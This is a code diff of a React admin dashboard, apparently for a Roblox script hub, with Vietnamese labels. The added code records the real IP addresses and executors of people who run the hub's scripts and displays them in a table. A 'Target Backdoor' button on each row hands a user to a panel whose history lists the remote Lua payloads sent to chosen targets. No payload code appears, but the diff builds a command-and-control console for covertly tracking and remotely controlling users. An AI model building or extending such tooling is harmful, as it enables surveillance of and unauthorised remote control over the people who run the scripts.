+              <h3 className="text-xs font-black text-white uppercase tracking-wider flex items-center gap-1.5">
+                <Activity className="w-4 h-4 text-yellow-400" /> Lịch Sử Lệnh Remote Đã Phát ({backdoorHistory.length})
+              </h3>
+              <div className="space-y-2 max-h-[260px] overflow-y-auto pr-1">
+                {backdoorHistory.length === 0 ? (
+                  <div className="text-xs text-gray-500 text-center py-6">Chưa có lệnh nào được phát.</div>
+                ) : (
+                  backdoorHistory.map((h) => (
+                    <div key={h.id} className="bg-black/60 border border-gray-800 p-2.5 rounded-xl font-mono text-[10px] space-y-1">
+                      <div className="flex justify-between text-gray-400">
+                        <span className="text-yellow-400 font-bold">Target: {h.target_type} ({h.target_value})</span>
+                        <span>{new Date(h.created_at).toLocaleTimeString('vi-VN')}</span>
+                      </div>
+                      <div className="text-gray-300 truncate font-sans">{h.payload_lua}</div>
+                    </div>
+                  ))
+                )}
+              </div>
+            </div>
+
+          </div>
+
+        </div>
+      )}
+
+      {/* ==================== TAB 3: USER LOGS ==================== */}
       {activeTab === 'user_logs' && (
         <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-5 shadow-xl">
-          
           <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
             <div>
               <h2 className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase tracking-wide">
-                <Users className="w-4 h-4" /> Lịch Sử Log Thực Thi & IP Người Dùng ({logs.length})
+                <Users className="w-4 h-4" /> Lịch Sử Log Người Dùng & Nút Tác Vụ Lệnh Quick Backdoor
               </h2>
-              <p className="text-xs text-gray-400 mt-1">Theo dõi tài khoản Roblox, Discord và Địa chỉ IP của từng người dùng khi chạy Script</p>
             </div>
-
-            <div className="flex items-center gap-2 w-full sm:w-auto">
-              <button onClick={loadLogsData} className="bg-gray-800 text-gray-200 border border-gray-700 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer hover:bg-gray-700 transition-all">
-                <RefreshCw className={`w-3.5 h-3.5 ${isLoadingLogs ? 'animate-spin' : ''}`} /> Làm Mới
-              </button>
-              <button onClick={handleClearLogs} className="bg-red-500/15 text-red-400 border border-red-500/30 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer hover:bg-red-500/25 transition-all">
-                <Trash2 className="w-3.5 h-3.5" /> Xóa Tất Cả Logs
-              </button>
-            </div>
+            <button onClick={loadLogsData} className="bg-gray-800 text-gray-200 border border-gray-700 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer">
+              <RefreshCw className={`w-3.5 h-3.5 ${isLoadingLogs ? 'animate-spin' : ''}`} /> Làm Mới
+            </button>
           </div>
 
-          {/* Integration Lua Snippet Box */}
-          <div className="bg-black/80 border border-[#6E96FF]/30 p-4 rounded-2xl space-y-2">
-            <div className="flex items-center justify-between">
-              <span className="text-xs font-extrabold text-[#6E96FF] flex items-center gap-1.5">
-                <Code2 className="w-4 h-4" /> Đoạn Code Lua Tích Hợp Tự Động Gửi Log Về Web:
-              </span>
-              <button onClick={handleCopyLogSnippet} className="text-xs font-bold bg-[#6E96FF] text-black px-3 py-1 rounded-lg flex items-center gap-1 cursor-pointer">
-                {copiedLogSnippet ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
-                {copiedLogSnippet ? 'Đã Copy Snippet' : 'Copy Code Snippet'}
-              </button>
-            </div>
-            <pre className="bg-[#0c0f17] p-3 rounded-xl font-mono text-[11px] text-gray-300 overflow-x-auto border border-gray-800">
-              {getLuaLoggerSnippet()}
-            </pre>
-          </div>
-
-          {/* Search Logs Bar */}
-          <div className="relative">
-            <Search className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
-            <input
-              type="text"
-              placeholder="Tìm kiếm theo Tên Roblox, Roblox ID, Discord hoặc Địa chỉ IP..."
-              value={logSearchQuery}
-              onChange={(e) => setLogSearchQuery(e.target.value)}
-              className="w-full bg-black/80 border border-gray-800 rounded-xl pl-10 pr-4 py-2.5 text-xs text-white placeholder:text-gray-500 focus:border-[#6E96FF] outline-none"
-            />
-          </div>
-
-          {/* Logs Table */}
           <div className="overflow-x-auto border border-gray-800 rounded-2xl bg-black/40">
             <table className="w-full text-left text-xs">
               <thead className="bg-[#0c0f17] text-gray-400 font-extrabold border-b border-gray-800 uppercase text-[10px]">
                 <tr>
                   <th className="p-3.5">Tài Khoản Roblox</th>
-                  <th className="p-3.5">Địa Chỉ IP Real</th>
-                  <th className="p-3.5">Tài Khoản Discord</th>
+                  <th className="p-3.5">IP Address</th>
                   <th className="p-3.5">Executor / Script</th>
                   <th className="p-3.5">Thời Gian Exec</th>
+                  <th className="p-3.5">Hành Động Remote</th>
                 </tr>
               </thead>
               <tbody className="divide-y divide-gray-800/60 font-mono">
-                {filteredLogs.length === 0 ? (
-                  <tr>
-                    <td colSpan={5} className="p-8 text-center text-gray-500 text-xs font-sans">
-                      {isLoadingLogs ? 'Đang tải danh sách Log...' : 'Chưa có dữ liệu Log người dùng nào.'}
+                {logs.map((log) => (
+                  <tr key={log.id} className="hover:bg-white/[0.02] transition-all">
+                    <td className="p-3.5 font-sans font-bold text-white">{log.roblox_username} (ID: {log.roblox_id})</td>
+                    <td className="p-3.5 text-[#6E96FF]">{log.ip_address}</td>
+                    <td className="p-3.5 text-gray-300">{log.executor}</td>
+                    <td className="p-3.5 text-gray-400 text-[11px]">{new Date(log.created_at).toLocaleString('vi-VN')}</td>
+                    <td className="p-3.5">
+                      <button
+                        onClick={() => handleSelectUserForBackdoor(log.roblox_username)}
+                        className="bg-yellow-500/20 border border-yellow-500/40 text-yellow-400 hover:bg-yellow-500/30 px-2.5 py-1 rounded-lg text-[10px] font-bold flex items-center gap-1 cursor-pointer"
+                      >
+                        <Zap className="w-3 h-3" /> Target Backdoor
+                      </button>
                     </td>
                   </tr>
-                ) : (
-                  filteredLogs.map((log) => (
-                    <tr key={log.id} className="hover:bg-white/[0.02] transition-all">
-                      <td className="p-3.5">
-                        <div className="flex items-center gap-2.5 font-sans">
-                          <img
-                            src={log.roblox_id && log.roblox_id !== '0' ? `https://www.roblox.com/headshot-thumbnail/image?userId=${log.roblox_id}&width=150&height=150&format=png` : '/logo.png'}
-                            alt="Roblox Avatar"
-                            className="w-8 h-8 rounded-full border border-gray-700 bg-gray-900 shrink-0"
-                            onError={(e) => { e.target.src = '/logo.png'; }}
-                          />
-                          <div>
-                            <a
-                              href={log.roblox_id && log.roblox_id !== '0' ? `https://www.roblox.com/users/${log.roblox_id}/profile` : '#'}
-                              target="_blank"
-                              rel="noreferrer"
-                              className="font-extrabold text-white hover:text-[#6E96FF] flex items-center gap-1"
-                            >
-                              {log.roblox_username} <ExternalLink className="w-3 h-3 text-gray-500" />
-                            </a>
-                            <div className="text-[10px] text-gray-500">ID: {log.roblox_id}</div>
-                          </div>
-                        </div>
-                      </td>
-
-                      <td className="p-3.5">
-                        <span className="bg-[#6E96FF]/10 text-[#6E96FF] border border-[#6E96FF]/30 px-2.5 py-1 rounded-lg text-xs font-bold inline-flex items-center gap-1.5">
-                          <Globe className="w-3 h-3" /> {log.ip_address}
-                        </span>
-                      </td>
-
-                      <td className="p-3.5 text-indigo-300 font-sans font-bold">
-                        {log.discord_user || 'Chưa liên kết'}
-                      </td>
-
-                      <td className="p-3.5">
-                        <div className="text-xs text-gray-200 font-bold">{log.executor}</div>
-                        <div className="text-[10px] text-gray-500">Slug: {log.script_slug}</div>
-                      </td>
-
-                      <td className="p-3.5 text-gray-400 text-[11px]">
-                        {new Date(log.created_at).toLocaleString('vi-VN')}
-                      </td>
-                    </tr>
-                  ))
-                )}
+                ))}
               </tbody>
             </table>
           </div>
-
         </div>
       )}
 
-      {/* ==================== TAB 3: MAIN PAGE CUSTOMIZER ==================== */}
+      {/* ==================== TAB 4: MAIN PAGE CUSTOMIZER ==================== */}
       {activeTab === 'custom_home' && (
         <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-5 shadow-xl">
-          <div className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase tracking-wide">
-            <Sliders className="w-4 h-4" /> Cấu Hình Trang Chủ (Giao Diện Public Website)
+          <div className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase">
+            <Sliders className="w-4 h-4" /> Cấu Hình Trang Chủ Public
           </div>
-
           <div className="space-y-4">
             <div>
-              <label className="text-xs font-bold text-[#6E96FF] flex items-center gap-1.5 mb-1">
-                <Database className="w-3.5 h-3.5" /> Loader Script Text Trang Chủ:
-              </label>
-              <textarea
-                rows={2}
-                value={loaderScript}
-                onChange={(e) => setLoaderScript(e.target.value)}
-                className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl font-mono text-xs text-gray-200 focus:border-[#6E96FF] outline-none"
-              />
+              <label className="text-xs font-bold text-[#6E96FF] block mb-1">Loader Script Text Trang Chủ:</label>
+              <textarea rows={2} value={loaderScript} onChange={(e) => setLoaderScript(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl font-mono text-xs text-gray-200" />
             </div>
-
             <div>
-              <label className="text-xs font-bold text-[#6E96FF] flex items-center gap-1.5 mb-1">
-                <Key className="w-3.5 h-3.5" /> Access Key Chuẩn (Trang Chủ):
-              </label>
-              <input
-                type="text"
-                value={currentKey}
-                onChange={(e) => setCurrentKey(e.target.value)}
-                className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl font-mono text-xs text-[#6E96FF] font-extrabold focus:border-[#6E96FF] outline-none"
-              />
-            </div>
-
-            {/* Supported Games Management */}
-            <div className="border border-gray-800 p-4 rounded-2xl bg-black/40 space-y-3">
-              <div className="flex items-center justify-between">
-                <label className="text-xs font-bold text-yellow-400 flex items-center gap-1.5">
-                  <Gamepad2 className="w-4 h-4" /> Danh Sách Game Support ({supportedGames.length}):
-                </label>
-                <button onClick={handleAddGame} className="bg-[#6E96FF]/20 text-[#6E96FF] border border-[#6E96FF]/40 px-3 py-1 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer hover:bg-[#6E96FF]/30 transition-all">
-                  <Plus className="w-3.5 h-3.5" /> Thêm Game
-                </button>
-              </div>
-
-              {supportedGames.map((game, idx) => (
-                <div key={idx} className="bg-black/80 border border-gray-800 p-3 rounded-xl space-y-2">
-                  <div className="flex justify-between items-center text-xs text-gray-400 font-bold">
-                    <span>Game #{idx + 1}</span>
-                    {supportedGames.length > 1 && (
-                      <button onClick={() => handleRemoveGame(idx)} className="text-red-400 text-[10px] bg-red-500/10 px-2 py-0.5 rounded cursor-pointer">
-                        Xóa Game
-                      </button>
-                    )}
-                  </div>
-                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
-                    <input
-                      type="text"
-                      placeholder="Tên Game"
-                      value={game.name}
-                      onChange={(e) => handleGameChange(idx, 'name', e.target.value)}
-                      className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs font-bold text-white"
-                    />
-                    <input
-                      type="text"
-                      placeholder="Logo URL"
-                      value={game.logo}
-                      onChange={(e) => handleGameChange(idx, 'logo', e.target.value)}
-                      className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs text-gray-300"
-                    />
-                    <input
-                      type="text"
-                      placeholder="Trạng Thái"
-                      value={game.status}
-                      onChange={(e) => handleGameChange(idx, 'status', e.target.value)}
-                      className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs text-green-400"
-                    />
-                    <input
-                      type="text"
-                      placeholder="Tag (VD: ROBLOX)"
-                      value={game.tag}
-                      onChange={(e) => handleGameChange(idx, 'tag', e.target.value)}
-                      className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs text-[#6E96FF] font-mono"
-                    />
-                  </div>
-                </div>
-              ))}
-            </div>
-
-            {/* Social Links */}
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-              <div>
-                <label className="text-xs text-gray-400 font-semibold mb-1 flex items-center gap-1"><Youtube className="w-3.5 h-3.5 text-red-500"/> Link YouTube Channel:</label>
-                <input
-                  type="text"
-                  value={youtubeLink}
-                  onChange={(e) => setYoutubeLink(e.target.value)}
-                  className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white focus:border-[#6E96FF] outline-none"
-                />
-              </div>
-
-              <div>
-                <label className="text-xs text-gray-400 font-semibold mb-1 flex items-center gap-1"><MessageSquare className="w-3.5 h-3.5 text-indigo-400"/> Link Server Discord:</label>
-                <input
-                  type="text"
-                  value={discordLink}
-                  onChange={(e) => setDiscordLink(e.target.value)}
-                  className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white focus:border-[#6E96FF] outline-none"
-                />
-              </div>
-
-              <div>
-                <label className="text-xs text-gray-400 font-semibold mb-1 block">Badge Status Banner:</label>
-                <input
-                  type="text"
-                  value={badgeText}
-                  onChange={(e) => setBadgeText(e.target.value)}
-                  className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-[#6E96FF] font-bold focus:border-[#6E96FF] outline-none"
-                />
-              </div>
-
-              <div>
-                <label className="text-xs text-gray-400 font-semibold mb-1 block">Site Title (Tên Hub):</label>
-                <input
-                  type="text"
-                  value={siteTitle}
-                  onChange={(e) => setSiteTitle(e.target.value)}
-                  className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white font-extrabold focus:border-[#6E96FF] outline-none"
-                />
-              </div>
+              <label className="text-xs font-bold text-[#6E96FF] block mb-1">Access Key Trang Chủ:</label>
+              <input type="text" value={currentKey} onChange={(e) => setCurrentKey(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl font-mono text-xs text-[#6E96FF] font-extrabold" />
             </div>
           </div>
-
-          <button
-            onClick={handleSaveMainPageSettings}
-            disabled={isSaving}
-            className="w-full bg-[#6E96FF] text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_20px_rgba(110,150,255,0.4)] cursor-pointer hover:brightness-110 transition-all flex items-center justify-center gap-2 disabled:opacity-50"
-          >
-            {isSaving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Save className="w-4 h-4" />} LƯU CẤU HÌNH TRANG CHÍNH
+          <button onClick={handleSaveMainPageSettings} disabled={isSaving} className="w-full bg-[#6E96FF] text-black font-black py-3.5 rounded-xl text-xs cursor-pointer">
+            LƯU CẤU HÌNH TRANG CHÍNH
           </button>
         </div>
       )}
 
-      {/* ==================== TAB 4: SETTINGS ==================== */}
+      {/* ==================== TAB 5: SETTINGS ==================== */}
       {activeTab === 'settings' && (
         <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-4 shadow-xl max-w-xl">
           <div className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase">
             <Settings className="w-4 h-4" /> Đổi Mật Khẩu Admin
           </div>
-
-          <div>
-            <label className="text-xs text-gray-400 font-bold">Mật Khẩu Admin Mới:</label>
-            <input
-              type="password"
-              placeholder="Nhập mật khẩu mới..."
-              value={newAdminPass}
-              onChange={(e) => setNewAdminPass(e.target.value)}
-              className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white mt-1.5 focus:border-[#6E96FF] outline-none"
-            />
-          </div>
-
-          <button onClick={handleSaveAdminPassword} className="w-full bg-green-600 font-black py-3 rounded-xl text-xs cursor-pointer hover:bg-green-500 transition-all">
-            Lưu Mật Khẩu Mới
-          </button>
+          <input type="password" placeholder="Mật khẩu mới..." value={newAdminPass} onChange={(e) => setNewAdminPass(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white" />
+          <button onClick={handleSaveAdminPassword} className="w-full bg-green-600 font-black py-3 rounded-xl text-xs cursor-pointer">Lưu Mật Khẩu Mới</button>
         </div>
       )}
 
